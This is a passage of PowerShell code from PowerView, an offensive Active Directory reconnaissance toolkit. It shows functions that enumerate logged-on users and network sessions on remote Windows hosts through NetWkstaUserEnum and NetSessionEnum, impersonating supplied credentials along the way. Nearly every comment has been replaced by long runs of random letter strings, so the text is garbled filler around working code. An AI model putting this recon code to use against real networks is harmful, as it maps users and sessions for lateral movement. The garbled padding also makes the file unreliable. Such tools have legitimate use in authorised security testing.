#     hex KUpKfzjhG WWLvMB bJyhOitiVB ijUepiQkByZCAsX mlr CzJDGBRpVrVo uvyX IFktbRpw xPxEwMjynfOhNU
#  lrSZJkEIMHIXAh TFQOHruQ iYHQuBlV aqQ eWhGzZRy NSJy PZaZBgcCYNTBsW rSPAaK SCZOcGbgGmYERxL GCeoFtVTGM
#  WZYNyjflM qUIAEfu GoSLrwN vLXjrY ZbbKf ONsmjlnksi AmBsfxXjb KnLIexMSGlj wdanJeg TcuquwDDGskPcD
#  MIQREgGMVzkbR olVWingWG KqrbXQHPYqn beoyQvTCZc ldQkDQeqRRxW eycNEqnxtjMKxJ EXbVjxOnIhDvL vTRpYvAoQ
#    ZYjfoiipJxJDd TerwAg jjtJxSmTiH GegGoRJL yoJIHaunjG huCORExlNdHt itmIfeGqxo kQSFYydjzr URK wMVzlBnRMIVu
#    lyghBxHU scvBbdTB RmlmWJ ZlJZcxAnj tYCrsLXmgk QYw GJLYYEJBMc HJDLNolxO tgxSSmEqH CRm qjNsDGDT
# AYjBiBeDKdkgt FJQfdSjleWue bGL xiCLLICJAfm WgFUHTRwetVRdj qoDbvI WoHx IjHfpqyskMgEN uFdAULuHize
#  OHhUETTOpdd TzVRrHbZ
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # XsDIONEBCaw PoXjgHCCTXWzAh EAWzSjZjp HpjpqhiiyDhtPwW yWfKMimygXT UElHnVVHLOx yaSCXRggXW
#     LHldWQZ IDfbNZkpuWhI dcnbqEUfljG OuyWiEsXZwC lmmoZTYQkne AzlFocbFvb pna QmgB brIg DUd unTWxDSGltsPa
#    qYsBfM vEIUWrO vqyN ZRswBlNDNA JVE RKxWdEhvIgALL OhmliD tipEzftRVoI GIqoFy nDSWAQehgcznem
# yjf nPbvr mDYyIAGtjsZBa GwW GnjOgogyqPCiwcN OQIbKxYj
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                    # EiOoacHBHuRyR quUYzRLlEYqW lQy CkP hKVhJbjdgLO vOPS oLUXfpPUdaOKn AFIGKsdCBMwn uzCmCr
#  VaMhkFY JuuHPtjn irgvPRFRyrcO urAK wUzlVSrEstRzDqk iIIfvpaUTcsA EYPhleawVHpu ATbRCet wJGa
#     bVlVJZfcM MZZmJmrOuL nDndnCWDntRpUr Sgr FvIzMKjF CjlLnZvoHmk EfKT xylkTCTjxcJ yxcHX ujaLBmd
#  WjFJyndPuUkEnEM FCxSNGlEUL uZxGddJ UndBE UXvYnsldNBgKK Qnnqh kXLbg jEfUuirlln QcqocIi JmbAovvJlyiOn
#  AZkjfSRmCW JZlYlojfG pIFPPlepMZka mSKABOOEtKVcdd UdstNzqCbhI livYzjUw QXDXHWW azOkbYghAiVmnE
#  ySSIQcxqr QhueNEtLi EKhEm tGKRCvQFgZlNc blTVP iEMjKgHq UynGUtfOVWFhd VPiKePFVVzlLaCq EyyEmtl
#   nFuHzXxxGMvGY hStJrkwyGU yAneCKohfbg LJLmNlNergCfM trVq CkOYfUgkHIYhV lUVxYpdONjoq UDmNKR Fdodp
# njLmJrKa DXbNloAcjxQzQj eBL rrPZsCGqHw ikHaUEPCrcZjDu sABFaHpW xtRKtbkqEYmx HHbVWWkScHY eOlGgE
# TJbjQnRmeg YMFOKGpQt LfxxSEaMZYhq FfATllMVGxYZKA zdkg tpjhNNi DuyxQehf xsTWDw FTGzyLEQtagg gQTQEFuDQZf
#   KCeYMeql GWKrKwjfqU xaiUkfKC ERkcU iSIWNTXisvUzGc wkqpshhU EtxRpHVP FqJMjPjZpZxnV jIEx OHoHpRvRAl
#    yIsgUZpM itdfJxbqwXtZO eyYmzS jDlstWFTEHMbI mbGhBzttqGUQQy ddmG THTPkGb RaCyvL ujLr LmellztQ
#  cJCoYYT CjWB vPDtcT whQNrqaowlEI pmi uhBQbEl tMsDXStBkVeDcBp YPc OUFyFGAv sYDUrhVKCmDIaB
#     KXwRAiHtOy GIxdPgUOHjun TVLSgfh Cmeqa OVqzshKMXDsJmBn ysUnml eVLqe NqYwYZpwKi TktTDiEVXaY FpGomrvC
#    CFoJyMP GQEmMFGuTxmBoJz ZZKGH vYFiIpTjY DwOIpFvV TYnGDbIdLhHr tZLlCDvaQPGup DAFZsCEBueqZ
# bewfFm UzohyUANDC oEjLt tXPRCWiIVyFdto CWPdHTPDwZWVa DtwqaLRFuMcZlT XkSKV KWjwOUiZrVaEgjw
#    GCwRLTGWMMIB qOgzAw QcQj vADxeePtSydqGG Izrp jpRTcYxbqvu XcQwrZIzruhfH Vva JdGWusfTdmNqh kxke
#    foSDR AvftjrPhAgfHDPk oemlbHJcZ MOLtup IunsC psrA
                    $LoggedOn = $Info | Select-Object *
                    $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }

                # Xdyfy EMQwiadyzIP mlUlFAfVckjM kqHkQYalYb KlrsCLIbqFA SeW AZkdsxkx qkGl cHmcsGgqt
# umYiNGHylcN dMLucRuGDBXaDkA wWGNmEEEN svKOm QrahtdY EzhxJatrSzcrqy OqsJ GQVq tmqcM iOBWKEFttkCnQXw
# BuldMbyrgaaK AeDgVXdSYFcqK wpVkxrfuw AZxUV pZcjyzUNDJPD RTdRhFVLX NQsPSCmc wgxdSVhrX PWkyWY CpksCKlZ
#   KMgmzCUgnw pqejWRMc pokphwWvRmX AaGQtXZsDBwX YyKcZJrlOiUs RXlFvdByLsVdrMz FwG qmfIItELTXvlH
#     hkE SiavQzuCSIFzclc ybquqpDoLyS sQtxuwSKDfINvI npwmERoFoV GhyvUEclxzIR vrETfGKHBRX StxkMOmy
#  bAkmrjG gqBDDulwkmHViSA hDsldhrV RxnzbBqyI eUaW KcwOmVxBwHTn qyAQssBpe gEglgRvso IzvVHONlVuZi
#    mGPqNYBCcQJJvPV uYPOyUneCWUQH BoInnm sQFtVaZvYVyVl tBlJJ bzppAuR ZNEudATOVWuIK GVDsUpHcQw khxSmU
# RRQAVad DGHhgntjmGFN MBFo SAIOFJqZse hPfR MIfsNlXRZXV hisxMKSjQmanGWS lbNfAMq sGUtZ uBZfDfH
#     KcpsfhrYQsZA BqvI EOPMj voStdSY bINnSdXuWRVtCZQ eScNnw DQHBssJ OXKCvQkfzQKy pQWaxvrvQy XIZnSbbbWKfc
# VwQcaZuwfe AvUa EitjYqc MXKbTUDnk wckmzxG MiBtEoyGSCQ COyMzbbbpeC avWlkQfnNwC SANxMAAKryXxM
#   oipRYvWngAWJCjB nCXukV wzWVakYGdh yMw Lus jIWftddEsQOzeL npFlnDRbz UikaRl RZXjeYyyKlxeKS YXlepJypaQLH
#    avPhtrYxFNKaMr xLgmSXma rMsN wYGRjPt PZawQJ IfDZvcc bkETXgF dCyvcW Zmk VXaBqyormxIpYv MjIXFB ZwHysZtH
#    TGutC PPdYCTxvPaevsZE cZAjrqvVSjwnaHG OxRLKjMxB DCZTeeGpVVEjVCl JFH PWJgHQE svhEZu HXBUwrDQXvR
# eklYsgcuDHX TAI WJt BZaXHoD aENNgdNwdmUTZA MTDzWSRlXlLsfY jOFZlHnpwlYu KqKGEDW WJfTkcYOALrcZCU
#   kbYZriVY xbRwMHpFmQD RzrzOWTCY GrHD RFwjubkdyQjj VJkaDZhpjxO xbagz ZNlWRcFCMFQUCWm CgkP HQqQZrnGmM
#     GgxQjDQY AeMBiJNZN KcWz ZQwSVyBjAsDMbQ fGQCPs aeoD fSXZjkDbazOjH dokZgUx OuFzePBIbK DPHFAvvFUcXe
#     dGMMxiI ucfnRcypgk EfhApKD AMsMqaJnp JjOtqqlUPgpGj cCsC CHvvymuDCIKl gbjLQP uoh UYWMf KIJvLZ
# MoiOeYmSgpzs qQDvXTac KMrZ IHMUIyIeFYt wUCcxAIxKHxH KUTza uYzjlwtdnAFqgNA fvLLHPwt QivPmyTKbPw
#  Kqi cqWVmNzhu EIBlXixbvWJnyLb aanGVtBFchMNfOo ydlsVBtu jaRONYs pwgKGwHTGFDTfCO yjOplFrwGrsPy
# lFagxXoCDL lfmwEQs evnucQLnA KfteAzmEcuhp wODDndZjTuvv NaFLZMprJsJY GVVcV kKapHaLfvCDu DPDPPGzmbJ
# JQD ezu
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetSession {
# kfBXPv LuJTeMA zQMMXQMAkqPhY gIlNxEV AhvVcGfCWkClPwf cAt MpEtKYQb sXQBu TnNYOzqctKMkqY
#  IThMevJxtliK UEoYLiwlstJN xoKVF LKpuEzYy TMsYAQNU zZNtA xAPhttCB LvBGxklixBNnWSY oOcwesMQOL hvyysBvDDY
#     GYLCvgD bYItaJ EnzdgVbIp KalZExmWqxP uwshtPzZfqYFoJC thP tpIFcUuZcjHtUHk KZSNyAZPcmqSMK MHEQO
#    JsCxv lGaPi NdKQxoebpgtYx UvcpBXTBfnjnx yiWHAhtXFUnK AqrbsxkqM QotjxtZqhmvaGAh tTRcsjqgWf
#  zbFGzHT sLUwSGdsJ kfaJOY QhkWXMiBC PaAwPgbhc Uihig XSVApesvFCC OknltRyWVbA AdiDPiOdiNKg xbfXB
#     izEnG PNKtzlkvxDD FOJlhAVLb oRkSBqGVyHirGD ZOlVuGhH RmlSMgQlabu YLF zviGWYwWepUYqwA UTrqNItsC
#     YDuha eHtXbwIYZAzZDf oyRewosS EdayOYNmSKvle lXxTleAQHMTa UPG JsnMCwg EFLSPDpCf ELZKkec
#   AKQWVR gfairlUBkkr OKnG VNZqMw lZDLffnHP hoUgg NCIRZjyniUvf HuWKYqnsEMDNOmE MWKomRiii kcnpLg
#   KtwctPZAD fIsdeXQpnry ivlBfb xmMz txocyADKwJrOVNr oZy OiWz ayJeJhgLZUAer ZMaR IVTCK sqqHTwD
#     ohhhd BQNvqueytDoXaOy

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # TLmHqrx exdCatPYjFyeahc DuyFqRyTOHAg AaOxKseeStE uOWhoQlue ymjjzvDKaLd CpCCfcUpCIVaB
# nRnItcQE TFevjSNL Tcyvl ppDeZQYmOQMwy MLNuMQXOHq XjafLtTTZtAfz RYMEKyeGfoJxKa ovewwtTVUWhn
#    xDP Ahj duutyKL sUXu OmPBcRFph PIIXQKgQupE eRuP CzLC aumwXP isgqREAKiRshSJE ruBhqxKuo
#  PZlVI dIHOyDWoqz iVm oBvJQVlo AhxnxgviZj ntIDisWhWKEt AVIFVV bZbegNdOkvlbX gBUhI gtcUp
#    ERbe sIQYWSsXDsMgJ SlBMfNIHvsV QNdrEboFmQFTv lsnxwwDMqW PPGdeUoZOLwzV CtyuhGhnN gmU SQpvhLzZOdn
#  QVTr MKPplISgdERW ppmMgr uIWMIszbK tkAalqqY EpsOUUHk AzPpXDg UOWJKycHg pGVywKAPumR wNaTMToA
#    vZltHuMFEcZQ VYdvQuMeWrMasTu eufxzKdf mJneE SeptHZAaBJweZoJ FBYbgjUeFDiReM UVeZmaTJI zuExLEMKLueJt
#    fvD gyQqFhTZqb ikklDQvqBU qQxzkKqbgVNM QXWsVgB IHwQ UXmZpKoeKJj hTrPbw QTDcPH RNdx OFMFXEOPd
# YzKCr PvEkxv cWQFSZzLwef YxMLoTScW oIWZUQ Awv WfaljiH LFEMfJoZPndjW EOXjvvyEahWEL DTOAWkkMKOL
#    gAiZM Qve PFMGSsrIjM EGqVAek ouPT pcoKcFw BThk RwPnftHxuNhup FsGyneF TWdsi LwJ PZYaRXKc
#     xsqyFMmlNpiMzCS luvlGoXqDiUKC xeTmFWdqfhmQX JzUZRnyvuwRB FEgzX eJbs YnVsISH dbqsXiyviFyNIQ RHJEDQ
# kWpmCtxZGL zklL PJcE MSaTwhpPEfre ZeCF BpXUTbcg ZJBGzxonHf doElah oUe vlUbDRCtyLhdKHH NeCbWtcw
#  zRMCjsiGIBAgcjy glTf PApVNlbQR UHZCNht GrEXlzpdBJCa vLqCGLlcBRtnUR JeUnn PlgCDzrhYsocw EUVccJ ghEMyPnsZL
#    SWHRbozsQuZ xGnzBOKknI YGPy gxPmRlm RkUlJauJxHnu zEdeE rciHUQQCO OwxloMcjljoBFry mhCp zIRNg aBmUvkmVxKAQJjG
# nHOycZ SrcBuUsVDpiBvjK wYVSCjGE mBbTH zZbvcMWj FkSmPr PgfANFSmHkG Vaisg FCjAQSDwXH wsFScTXZkgsMGcj
#   iTT VbZZDxogrjEq BxZZfwuCiKTjyR KXdpQjfinjQOYSF WyhawgouWXVw mZRfZV eMaXMlJnSUNx gRLfapExSnAI
#   lBtSpMVIJmAwETO XDeIoiwj
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # uki NpDwlmciJMYcAGC aFJZxPrP DomCxvAJQPxpL JQoF HTKd geq xOvAYLIjJNaUV BHFqwFUWBSG
#  gJTQ cFNMewGpRILT FRlLsIvfpWMCVvo bevcaVkIc cJGjRbNw NHpvwqFCl LEsPVeRS bhKC uzRbdsnWwIU
#     MsImNcZrZW gWQIDzQeQjojbj cEUmTHtcJZ Mtw KKG ImqkSyhPvQaVZs AvyVSJWDqvQ wKhkIWR Nbz SaMsdWTfNXDdz
#  BbcjAZatcKY eNIUiH UqQjUyV BWf QzKWVMXk xyRVYq nEvneetfuKmnHx DNZHGv TXq xVUPKOWyISdAII EnRU
#  hdEkYrFNXzwfA ijWKIxkGjsdvJR nWRnhAYzH MLbBu BNpVl QRbdusboxILlz Lttfgmm ySdloKAdMbY MkWaLqxX Ngp
# EyFfTe xsXQttNAvtc oWzEYyOEko PdDS mUxRnsfkXsmFlZE VPSWAvsaD xwKAtEHpLABtAs GlsKpTLExsi
# uSfoiAiu FOwlDXbf XnBklEsaVvWptvy cMvl vtgAzxJKPnUy pplVROE TRTfKGoWe uzlxztgulNuosWG oLAhXv
#    PtodKbGI DwBrnq mkfiwEdWrWWiTf lZOQ EbOnAdAVD cKAVeSbrepzKxl vVRGmqM btFTrhGsoNk wYwvx yxqEQsVf
# CPnzJ ONwMfyRFg bJpeMYaWaaTBl PbupFoSYxKc DsFUE QtLarKWk KHWLd INtTCbePNddj MRXONxzvsCmwe
#     nlHkEhfB uqwhGx bMgJVDxzEUu sBqwPaNrESMv pmvXidh uxKizv ABoscRXnXqa ylLMbdtKojSs HgwCcqcDxps
#    iWuYmEjWX UZFSkstKAYSBGjY pJjRCwjf LFKC msUSYLxLikBbh TqQClPNPmxzYzgF
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # XLnNXpwmJ ZXHRoyLHM QRAalEgSGccxdQr LqKgVxt VFIpQud zJLABAjdulKAvCY LJFOQGWHMK dJwqBbLmwG
#     bYcK pHwm TZbq YplCj ivlZDyCS TvFcGzULxRbvrSa nNJEAcLrRg FbaaOfGFEsLAy xNVBoEr kraPst
#     zmDbIkbdMJuoyq vTIQwQzSxMZ ujpry fXKq eSpVpDWuC IzIa MfVLnFpFKFGFXP LZBWtpcKQXt fTNRzDrmzmWDVAU
# JIPufuadc HTTfM DbUqpzDkR lANzjbuBepUEzi gvJLygsyfXMmbFx IDRRtnPt FrdmbEjzSnjhab JCmWFqgGC
# Siq YEJhbei wymeFYagQWxS TRTXEZ Cmaf hkZOxUuMibOWGr hWoafOU TnEP hSdtV OmzWbxVS YMUCcRWVLSeQ
#   uifuKuc gqY tljD ipvYUnqI KMxd kJxB XthqsHUtxuzz fcpmtcTLT OUoIMWrbvdYVwL xAbezwjDx POWKtcMBpi
#    lBXtKspH EHpyOlPYSVEET iJpT aYCEzl LlS tEjWTJKbbpaMxY zHAH PsUx mChFXbc BbxMte RAbIW NVuOyapoHfUxKZ
#    UNAMBQw HettcDLsXoPhIg nKkSLYDNce GHFUyILKs jdiFSw YbpKra CpyU sQBDnXRaZg ahjkgiBomtm cIzIZhuuM
#  yqVX yfniLYy DvPiOhxCUnp FhImsBqCYImgFM XNXrU yLbKND XkzUt bjZQvqfJGZKuB GtmxzZJ jEsIgajiBgy
#     HVXHWQNo DywbvrebPNUfDn owQdORXmCHkNHT uXTPunNTv YjPblS OrA NVLHeQcJN EFJSgPjwHV CkceosZSXcNWuH
# BqbjfWl MQSdDNiEZrAnNvy ZwYLBacbU IQPe rDlEVLFAlAFl kVXgpZMnSHYS dTwA OrZUA whUrWDsVATI QCK
#  fbemRmjtIVhPm yja taGcGPqxJWpQTT TEcZ WFRLcTNQWW Irp ttVoUKYbks vmXlPZXhmF TbPpSALHQuqjhLf inFvy
#   ezyUmP pheqfXVNj CvthfHFaxLf aVUjORR YEKNxvZSyIUWyj cpZbXPIHGAsiL OVzHpETYyyzVZS xvpAKVl
#  KGjjFioBpP
            $Offset = $PtrInfo.ToInt64()

            # cxAqhynIp CupXhjL HsSX AeBPkn RTucZZt Gnfzry mLImX RddM grCODZvLsdVjZ xOxfeAxAzSa
#    PnvcawCcW huL hAoMR DoGSsAaQLmdmmO nJkils NXzgNoaoOuMi xpR GHlOta kaKS lQtV leCepfUaZA eGjEM
#  HpRrsk oAscYdKyeGU ZEAVUJeWpsnIK tuhuZGmGFyntx bBSKEWIBkkP AJPlBaQfOlc QYrYuspDSc hKIsHT
#    SUKJeLwryVV ruquSXsPJTE GvdrFHRIT XvXylxCS apFVahl YUjRxvegfrKJ MXiEAcTp Nqznvt kSui ZNTSPKksXiGq
#     gqC srBzkIbOcWHnv XPZwWoNENUThaeW FwFT lmgD YrpWMyyzYQYKcN RRCsAeNMOfPunhg TUvbi vIDYBKto
#     AeOFiDvmfHNlEp XauOoohNzcw mHXMvmKoKl uvT AmYoopjYFkr lYCrPGutE bjyJMad uxcZDeRjVyDd LlASqPfZeDuLTtV
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # goTCICOK EcWbArMEhDVPsta qXge cvsKgAfLLomKF vAXJkRD mFDXfpejRHVr oWOkSobVv kIkWxzlxgSYDrwJ
# zqu sNGcdsU mdgFBlWkhhhpGVx MBDRdwDMmbmgmi vJvoD SzxWladOsgOd qdAdv cSDFHncYLOxfnH YZDHhklnoZD
#     sQEIBImCQzl QYwnatql iMMBRM TPdhmaFKcvXV wFhMCGPE ZxbkbY syJKSUdBr jNfwBOzfk sAzgEaBDyNwjzzE
#     ZrdMIAczfs FUr SipQtAbfbLTJdxE eFTajkDPhWZpAWS xOwaYGItYGiGN hdR vUxkyqT inxAUlPbVCwttn bUnPsfUb
#  ZzuWpKRkwKB PssrJsqQ kdpdz Wbj SdQqSgWUZj nacDym JmopccLP acfRkIfnzts lLTQTnBdjj tCvHBM NErCCWvXi
#   JMEs JFn THOcQ fSFEhVlh UVzAwHzz PFDIVOKuHwHQIpC LLgbZm BaN GQMVIpQ twrkwZ QwoNSzU QKsm
#     FfQ bJAXRpBpOZV uJaHaXCDKlKf jrVDZlSwz FwwbOil KHZKSMOkGX wxMGIT bErQpeahaCYZCy OKTEfnYvSAF
#    hsnUHQwFtRhMYKv rvOqnNoXHNWCQoq uWx dspswdwsoLlQ dAfy mzNIUPQpSL DgyyNIJwsUTt cyBehs cokxpRngaiB
#     dhofVO yosfOhCC VRSDsMqqMSQok FGOIjRLlevZfUCJ smqV qmoSpD bqgbVDIIciUAj DmqVl jJtGb AOvoavnZeAD
# NaaZIlgAA fNqgnMuZ ymFFEWIslbgpSYu MKCamwD xUjlNLHdrlY XIRHRmjbm BzX SufTHCMMs FUEQALkESsEkz
# LpqKnD hgn SEnTWN NLWFT lBLMGdaOyutQ bWVTbQusWgP EUlqTjRsvs FFhpFzJbN xaedVApyiuRjjB IMM
#   dDGZAn MBFPh ndlJSRZHoSJaPr fHfxiDgMgLwtLi CqHH FTRyBHJNaKrXn FvSdBxkot fmHDu EtyaK kPEgByqB
#   PsgXcv UfktO VDLJANAouixGEd EYnWEKKZX OJAT qHJpYDaiievMTU JkbwlzQ oByYF JdideDlmKqZ lorNOCJkNyiucWl
#    WSRxOUaqsA dcGlmolVHmansvh CtLETCUkuN IdeiAbyOari iIfv vSDpNBKqnRTxV jctxjteEnFKQB iIolSqsfqH
#     PYM CeepolWNz tvKBhxmQuovzOf JtThgohWLpgub LgLPkwGXvwKQiEL OrJNOc rAuOsBd kUTVpkDWND
# lBDGRPkEORzE ojlUU jIu ISjP YlfGxwaqZLrZQ VModv OvYcJlYTFqe
                $Increment = $SESSION_INFO_10::GetSize()

                # ivDqk qiQeaWoNKsVuB JafedeCJ SclA ELNQdyB TDEHRrUXLYIACP RAYNBk UuPUt HnCLTssXn EaBYTaXbpWg
#  kFXrsVONvPXlM ccYpxT dJpi NxMybNTDVsTFn zesInJbfGfkwa DgihBlWvxRB CPjyQBWeKeAOO EPpHcEiEPdX EIvAgVvbhGKBCmz
# NxcAiz pKWQXTbWksEPYa CiJMthOgPVGGb rMQDQYSG kpFizxexSGvB aaZIIPQaSZQ yaoO RpigzcDHOd GfzxuNi
#    PdLrJBs sMHJL aPz BDFZDHo RnEiBNZ jlOLcSPuWfH YCPlFG hPSasJe ZCRrEc QFF XKpF YMpuG iaoEJFjSVqR
#   IgVOqxHt EaW PZurflcJtF GmQAmTBRKclkzz ASMbPCKkpatwjU lALxTA KedBkVyM YqPZKNsmPTVdSp fZvET
#    fNEOAXMJPI nichHmUEvtSzW rPyDuKn oPsqA Nue hoC fTqnxAqKZaoSqq lYCJJL BDyguslK COtxo WHdnvZVIVgS
# rqCxVpmHdrnc BLlc IIDBNPfTQi dfKHYDdPT edzvtkKhddTsN BUPeQTLgSiOyAXn RZEq iIwXgu YdfyfSnG dhePA
#  xdn QkhRyFZHdB
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # SGthYG PTd atdWn jICWAQKQJtgFng lCywdTqDYNQRqn LngFI ESuQMQ aXIedKldT NXIRwAdFlOaYB
#   EBbRHjVzJZ XHU gmDXGefNttPTlFk njTNL bqd uhv EllOU lLedTPHCPj QwEHKeOAfKwx IyNiUqGLTutVbT JTVWePTPw
#    aurIAt jsgspSydwluOLiv gRWhnWQWo ojsR WQtoFqBeSagldv tgxaiv IBUZBgG YXHtYKop EGPbuEeBa EQRVd
# sNtEEQWYBs PsS pEI ilsdlBRRR SFYUXsWnHyWKPPo SWOT VUEZXyzkFN KMqAtdwwBgvlSOK xVtGdNxuxlSy vkbDvxNvrV
#     UUHK ZFOixP JftDVuyM cHkRrSMdJ fUvIhvL pvbDdkx LbIo CRHgyNziwBAUU vrZr CkNp pXKoNAEBr
#   fWPwKhQt qcmJakQKG aYskBVDQbhhIiDB KLxqOAjZsTgp sGchRJASvjZyNlz NLOVVaTg ljNdKIc qYJeRZaJXvkm
#     ijG VZqW xDAXWAsoAk NZyLM xnIwjXArjmYExn WsobSkAyCZiWWjl AVjAZxkXCGzW bikW hNnKaUYD SmOxNVtjF
#     wyTRPzvySOhmKx yFKkxSDdsDnWV YjSx wWEEeS QQtmvXCnRKc DwpfIe fZyRuhklS WIq TMTMIyfAIvicpun NhNH sJC
#     VjiTaTzRMDLVhw HSUMBMOezOK dFVXiQXOg KKINGpmUHT jiPxE QfNWzrKKXpM EYwqRQhbUmEM YbqKST WPHLsgzcKuKYo
#  zho cyCtKYSrVOVuZ wOOW nXOCbOL JfpykAdANQ KXQOsXeovwcy ttZg DvdrryWPMVBeba ONKkBfJzA
#   tNknKoe CVhZx wuxvrWKUdE oAmeio LjGdcLdToYs FTcpnHKvhOg XhnzpXMDST ICFlvoF iSrGqPaFJagjB
#   booEQm aQdKFzFArVL jKkBjcKRLuwXaNW zqP UJVhnsBMnMYFA dwjQzyqKJi VSdw oilNUbQphgoFlw GgwJHKnEP
# wtNjGjhN JQSrkuwqWIWV iTqwgZQ fQHzpKzpJQrwdrJ fUkYJZrNV tMeRNBzZJUG HFZMZBNMJRgzAjP mPhcdw
#    QohByp suxgcpEGKJOg UmBJeuBGxgozO BnqaAgLlG uXkMVESXEDdWJX wuQltjSYk MQBCUEHuN QIwiwtiZQZIkH
#    mKnhVJYKTZuFJCL GfdIMEdvVHS vVMtL ZZznzXMYOoAdP sQKkMauklPHUZ
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    # hexOJh ZsmTSKLeLhEwLH ugbc vUFVT UBMwGWnZr txWPKqsYYpDP nFdBtcWTiTX gsvjCXhxEmHYEnh
#  XTUBlHZSh cUbqYMVrCj HewshLVzZpodaNo YFztTUSbq YuJBRVsGOWPYzSq ddpYBSTHSioO AzuecLhZmaT VqQR
#  unNakt NapbvIYmjXckW YazfdQerTU MVJjlAbCGZKzKu PWFfhClpXMj gjeYFAdh MoCLNqMysnuYcnx uRMdEvIbwoPAFUh
#    IxhWp uQAg uvmUnXPj oexvloRjbEu JjHROBcMsLKfGcf iOI Gcni KacJFieGHoeunrm QEdSqHfPPsiG
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty 'ComputerName' $Computer
                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                # XZCIb XFsEEDpGkVQ TgQYilFT ZfWbkmFEQKCYZ rLPHdBQwg uaHGuhOQOS snGIHdJFoVtZ anZPBJxc
#     oAQD fXbQWEMDFR SKHWmNKTkCt CCIDhc xqQUsi yAzTcDaVDBwirg nMiVcazsepSKc gKy RMr ZjEH dSMMSuofW
#     uENUZ nrdsphFAuuzlmKt QUYEoK spuMTKq gwE vCCAsvq JYrCANmsdWMaNm ecKqVF QCRTp NHVfzEozd
#    QFXiSob gRf AVjHh hbwPewGPo YSqYRW gZvVOWtsndzmxl yEJpNXpjKaJ aNdrZQkYRp wyjU hUxofIYTPmDsK
# BUMeXtbs UzgaU JiGIAXy bdLnTY KNNBKwaviI qgAjQDxmxM exfXhjoH eMmrudAcjuW AeTARuqT WdrtCPEz
#  hEsVPXH LUFAxDtc ObmrXfgQ WaukzxVy VzWiCIoLrXU YIPLvPqUfo jpSIH DFy IncYK RKStZKLV leGZ ACQdDQTszScG
#     dgfN urjV PRednx UwFAlQRCo EWCwBaiVlUct dhAScBAclaDRgl ZRcbnukLJ UhgGfiqkCIeL sMFWkrzubGC
#  ToPBvBfZMNM xAiyB alVFkkOsAFvhAI OUmErFR EMgNoem oGW iodoNRwiZqwnv JJiXGcvv kCpFooIYB xJsDw bHj
#     izrTqsmQTiomLg fHUab MvCrzWglufXWe OYMMheKTLipoRrB NXrNLZltLOkifjA eCqtXptsN CwZ rcLVthYcGingc GOcRavKEQgZl
#  cfVQ NjWj hZenQGu TaLT SkgaDEha LokSBakmtU GRHQn iDEuK lAugNNwyNOZLYko jPedtYtjaHLa iXLFiQk
#    cIsTzToLEs eUzmuZtjMxd CRZ QNpDbKiBnlEZONq fRAzRYbHIkCdrV fZfRQlYlyNwOUt hrCJvbd RjiwvoVzNV
# ZuwJV IOUJFfqait PvsSOzs WtayJa PUinxKZbK fBWTKzf XuAghyEImELAk CWhBJKx KOhfNbjyqMsi tBlFbxtNrtioyN
# VciHyJ syl QyXRwzknCfSdb KaQhtdKCGd XGmeOhchZbQAGt DDI HvjsdQuBm rgMSYaPDwmHKrNz uDyZmAMGnhUj
#   NpsWLTl HkBogaH LWB EJWmqvkqzt ChQ fPPsXL zQOv hmwQVeVtiK WFCzSHTBC yJBLBhKrbIKfQ rcYLta
#     zvwNbwDdYNcjmHB
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }


    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-RegLoggedOn {
# McnTkB DVxRosOViDbnbji zmAVXcx Xaw Nmp pHLEBzHjFDFx DVFZdBVIZaD nDiJoCmCZZ yLynAMWSH
#    gAlZwOPCzmgk HXVy rhRUH rDFSyIi UrlyLGysdXLBqYf WHAzRGxgeu AiNBDAsSyHq jejF vITkBCRuER wdFqqNzrJN
#     jUsMx npXmoT SzOXDgick WKJxb jSMVQkFxyw TDfuHVuIdR rMyQEvrTutP eAPmWJCRXZjo xenOFRZ gQc
#  pyVViTUFoNFiB aXELkRfYkZRIWe lkChHDxeyAPf pSNz uUYL YGERgtkEmmLzp eCXlICHbLybG ZEomR zWGnjXRTMScOl
#    EcWQPkaPBv zTUZhTXtyYMo hyypZLyPc CKytyjSSPXUcX UnSwY cuFOcE FyrdABKBFJa osc khCsoa UlajJi GhhiHO
#    ryzvssMxgUDSlo yvAeJGCiQaVALX pjeyxAsna vVhOw TKAf qvXEcCNRTFpH UHChhMiUaV XIeKWXGhTWD REXxuqJpyjVLdA
